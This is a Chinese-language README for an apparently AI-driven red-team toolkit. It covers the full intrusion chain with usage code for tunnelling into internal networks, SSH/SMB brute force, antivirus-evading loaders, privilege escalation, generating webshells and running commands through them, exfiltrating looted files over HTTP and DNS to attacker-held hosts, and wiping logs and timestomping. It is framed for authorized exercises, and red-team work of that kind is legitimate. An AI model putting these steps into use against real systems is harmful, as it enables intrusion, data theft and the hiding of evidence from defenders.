# 红队工具集 — READMEFIRST

## 概述

本目录包含完整的红队自动化工具链，覆盖从外网突破到内网靶标的全流程。
所有模块通过 `KaliBridge` SSH 远程调用 Kali 工具，也支持本地执行。

> ⚠️ **仅限授权安全演练使用（HVV/红蓝对抗/SRC）。未经授权使用属违法行为。**

---

## 红队攻击链全景

```
┌─────────────────────────────────────────────────────────────────────┐
│                        红队攻击全流程                                 │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ① 外网突破          ② 建立据点         ③ 内网横向                  │
│  ┌──────────┐       ┌──────────┐       ┌──────────┐               │
│  │ 信息收集  │──────→│ 漏洞利用  │──────→│ 隧道搭建  │               │
│  │ 漏洞发现  │       │ Webshell │       │ 内网扫描  │               │
│  │ 社工钓鱼  │       │ 免杀上线  │       │ 弱口令    │               │
│  └──────────┘       └──────────┘       └──────────┘               │
│                                              │                     │
│  ⑥ 痕迹清理          ⑤ 靶标达成         ④ 权限提升                  │
│  ┌──────────┐       ┌──────────┐       ┌──────────┐               │
│  │ 日志清除  │←──────│ 数据获取  │←──────│ 域控攻击  │               │
│  │ 工具清理  │       │ 截图取证  │       │ 本地提权  │               │
│  │ 时间戳    │       │ 报告生成  │       │ 凭证获取  │               │
│  └──────────┘       └──────────┘       └──────────┘               │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 模块清单

### 已有模块（原有）

| 模块 | 文件 | 功能 |
|------|------|------|
| AI 引擎 | `agent_engine.py` | LLM 调用 + 命令执行 + 决策 |
| 自动挖洞 | `auto_hunt.py` | SRC 自动化漏洞挖掘主入口 |
| Kali 桥接 | `kali_bridge.py` | SSH 远程调用 Kali 渗透工具 |
| MSF 桥接 | `metasploit_bridge.py` | Metasploit RPC 集成 |
| 红队工具包 | `redteam_toolkit.py` | 横向/AD/钓鱼/凭证/C2/持久化 |
| 漏洞利用 | `exploit_engine.py` | 完整利用链验证引擎 |
| 攻击链建模 | `attack_chain.py` | 攻击路径概率排序 |
| CVE 情报 | `cve_intelligence.py` | 漏洞库自动匹配 |
| API 扫描 | `api_security_scanner.py` | GraphQL/REST/IDOR/认证绕过 |
| 云安全 | `cloud_scanner.py` | S3/Azure/GCP/K8s/Docker |
| WAF 绕过 | `waf_evasion_advanced.py` | 高级 WAF 绕过 |
| 代理轮换 | `proxy_rotator.py` | 多代理池管理 |
| 隐蔽 HTTP | `stealth_http.py` | 浏览器指纹模拟 |
| CNVD 扫描 | `cnvd_scanner.py` | 国产系统通用漏洞批量扫描 |

### 新增模块（红队补充）

| 模块 | 文件 | 功能 | 阶段 |
|------|------|------|------|
| 隧道管理 | `tunnel_manager.py` | frp/chisel/Neo-reGeorg/SSH/ICMP | ② 建立据点 |
| 内网扫描 | `intranet_scanner.py` | fscan/nmap/存活探测/高价值识别 | ③ 内网横向 |
| 免杀生成 | `av_bypass.py` | XOR/AES/Go加载器/分离加载 | ② 建立据点 |
| 提权辅助 | `privilege_escalation.py` | SUID/Potato/内核漏洞/PEASS | ④ 权限提升 |
| Webshell | `webshell_manager.py` | 多类型Shell统一管理/生成 | ② 建立据点 |
| 数据外传 | `data_exfil.py` | HTTP/DNS/ICMP/SMB 多通道 | ⑤ 靶标达成 |
| 痕迹清理 | `trace_cleaner.py` | 日志/工具/时间戳清理 | ⑥ 痕迹清理 |
| 红队报告 | `redteam_reporter.py` | HVV格式报告/得分统计 | ⑤ 靶标达成 |

---

## 前置依赖（需要安装的工具）

### 必装（Kali 上）

```bash
# 基础渗透工具
apt install -y nmap masscan nbtscan hydra crackmapexec
apt install -y impacket-scripts evil-winrm bloodhound

# Go 工具
go install github.com/shadow1ng/fscan@latest
go install github.com/jpillora/chisel@latest

# frp
wget https://github.com/fatedier/frp/releases/download/v0.61.0/frp_0.61.0_linux_amd64.tar.gz
tar -xzf frp_0.61.0_linux_amd64.tar.gz && cp frp_*/frp* /usr/local/bin/

# Neo-reGeorg
pip3 install neoreg

# 免杀编译
apt install -y mingw-w64 golang-go

# hashcat
apt install -y hashcat
```

### 选装

```bash
# Sliver C2（替代 MSF）
curl https://sliver.sh/install | sudo bash

# Donut（PE转Shellcode）
go install github.com/Binject/go-donut@latest

# pingtunnel（ICMP 隧道）
go install github.com/esrrhs/pingtunnel@latest
```

---

## 快速开始

### 1. 配置 Kali 桥接

```yaml
# config.yaml
kali:
  enabled: true
  host: "192.168.x.x"      # Kali IP
  user: "kali"
  ssh_key: "~/.ssh/id_rsa"
  timeout: 300
```

### 2. 外网突破后建立隧道

```python
from kali_bridge import KaliBridge
from tunnel_manager import TunnelManager

kb = KaliBridge(config)
tm = TunnelManager(kb)

# 方案 A：frp 反向代理（推荐）
tm.frp_deploy_server(vps_ip="1.2.3.4", bind_port=7000)
tm.frp_deploy_client(target_ip="10.0.0.5", vps_ip="1.2.3.4")
# 现在队友可通过 socks5://1.2.3.4:1080 访问内网

# 方案 B：chisel HTTP 隧道（穿防火墙）
tm.chisel_server(port=8080)
tm.chisel_client(server="1.2.3.4:8080")

# 方案 C：Neo-reGeorg（只有 webshell 时）
tm.neoregeorg_generate(password="r3dt3am")
# 上传 tunnel.jsp 到目标
tm.neoregeorg_connect("http://target.com/uploads/tunnel.jsp", "r3dt3am")
```

### 3. 内网扫描

```python
from intranet_scanner import IntranetScanner

scanner = IntranetScanner(kb, proxy="socks5://127.0.0.1:1080")

# fscan 一键扫（推荐）
result = scanner.fscan("10.0.0.0/24")
print(f"存活: {len(result['alive'])}, 漏洞: {len(result['vulns'])}")

# 或分步扫描
alive = scanner.ping_sweep("10.0.0.0/24", method="tcp")
hosts = scanner.port_scan(" ".join(alive))
hv_targets = scanner.identify_high_value(hosts)

# 弱口令爆破
scanner.brute_ssh(alive)
scanner.brute_smb(alive)
```

### 4. 免杀上线

```python
from av_bypass import AVBypass

avb = AVBypass(kb)

# Go 加载器（免杀率最高）
result = avb.gen_go_loader(lhost="1.2.3.4", lport=4444)
print(result["compile_cmd"])
print(result["steps"])

# 分离加载（shellcode 放 VPS）
result = avb.gen_remote_loader(shellcode_url="http://1.2.3.4/sc.bin")
```

### 5. 提权

```python
from privilege_escalation import PrivEsc

pe = PrivEsc(kb)

# Linux 提权枚举
vectors = pe.enum_linux()
suggestions = pe.enum_linux_quick()

# Windows Potato 提权
pe.potato("10.0.0.5", "user", "pass", method="god")

# 内核漏洞匹配
pe.kernel_exploit("5.4.0-42-generic")
```

### 6. Webshell 管理

```python
from webshell_manager import WebshellManager

wm = WebshellManager(kb)

# 生成 shell
php_shell = wm.generate_php(password="x", obfuscate=True)
jsp_shell = wm.generate_jsp(password="x")

# 添加已上传的 shell
wm.add_shell("http://target.com/uploads/x.php", "php_system", "x")

# 执行命令
wm.exec_cmd(0, "whoami")
wm.exec_cmd(0, "cat /etc/passwd")

# 文件操作
wm.list_dir(0, "/var/www/html")
```

### 7. 数据外传

```python
from data_exfil import DataExfil

de = DataExfil(kb)

# 收集敏感文件
de.collect_linux()

# 加密打包
de.pack_encrypt("/tmp/.loot", password="r3dt3am2026")

# 外传
de.exfil_http("/tmp/.loot.enc", "http://1.2.3.4:8080/upload")

# 隐蔽通道（DNS）
de.exfil_dns("/tmp/.loot.enc", "data.your-vps.com")
```

### 8. 痕迹清理

```python
from trace_cleaner import TraceCleaner

tc = TraceCleaner(kb)

# 标准清理
tc.clean_linux(level="standard")
tc.clean_windows("10.0.0.5", "admin", "pass")

# 选择性删除（只删自己 IP 的记录）
tc.clean_linux_selective(ip_to_remove="1.2.3.4")

# 清理上传的工具
tc.clean_tools()

# 时间戳伪造
tc.timestomp("/var/www/html/shell.php")
```

### 9. 生成报告

```python
from redteam_reporter import RedTeamReporter

rr = RedTeamReporter(team_name="Alpha", engagement="2026-HVV")

# 记录攻击路径
rr.add_path_step("FOFA 发现目标", "x.x.x.x:8080", "发现泛微OA", tools=["FOFA"])
rr.add_path_step("SQL注入获取shell", "x.x.x.x", "获得webshell", tools=["sqlmap"])
rr.add_path_step("frp建立隧道", "内网", "socks5代理建立", tools=["frp"])
rr.add_path_step("fscan内网扫描", "10.0.0.0/24", "发现DC", tools=["fscan"])
rr.add_path_step("DCSync获取域管", "DC01", "拿到域管hash", tools=["impacket"])

# 添加发现
rr.add_finding("泛微OA SQL注入", "外网突破", "critical", "x.x.x.x", "WorkPlanService SQL注入")
rr.add_finding("域控权限获取", "域控", "critical", "DC01", "DCSync获取域管NTLM")

# 生成报告
report = rr.generate(format="markdown")
rr.save("/tmp/redteam_report.md")
print(f"总得分: {rr.calculate_score()['total']}")
```

---

## 典型红队流程（速查）

```
1. FOFA/Hunter 搜目标资产         → cnvd_scanner.py / auto_hunt.py
2. 发现漏洞拿到入口                → exploit_engine.py / metasploit_bridge.py
3. 上传 webshell                   → webshell_manager.py
4. 免杀 payload 上线 C2            → av_bypass.py
5. 搭建隧道让队友进来              → tunnel_manager.py
6. 内网扫描找高价值目标            → intranet_scanner.py
7. 横向移动（PTH/PTT/WMI）        → redteam_toolkit.py
8. 提权拿到域控/SYSTEM             → privilege_escalation.py
9. 获取靶标数据                    → data_exfil.py
10. 截图取证 + 报告                → redteam_reporter.py
11. 痕迹清理                       → trace_cleaner.py
```

---

## 注意事项

1. **合法授权** — 所有操作必须在授权范围内进行
2. **最小影响** — 不破坏目标业务，不删除生产数据
3. **证据留存** — 每一步操作都要截图/录屏留证
4. **限速控制** — config.yaml 中的 rate_limit 必须遵守
5. **即时沟通** — 拿到重要权限第一时间通知队长
6. **数据安全** — 获取的数据加密存储，演练后销毁

---

## 参考项目

| 项目 | 用途 | 地址 |
|------|------|------|
| fscan | 内网综合扫描 | github.com/shadow1ng/fscan |
| frp | 反向代理隧道 | github.com/fatedier/frp |
| chisel | HTTP 隧道 | github.com/jpillora/chisel |
| Neo-reGeorg | Web 隧道 | github.com/L-codes/Neo-reGeorg |
| PEASS-ng | 提权检查 | github.com/peass-ng/PEASS-ng |
| Sliver | C2 框架 | github.com/BishopFox/sliver |
| CrackMapExec | AD/SMB 利用 | github.com/byt3bl33d3r/CrackMapExec |
| BloodHound | AD 路径分析 | github.com/BloodHoundAD/BloodHound |
| Impacket | Windows 协议工具 | github.com/fortra/impacket |
| RedTeam-Tools | 红队工具大全 | github.com/A-poc/RedTeam-Tools |
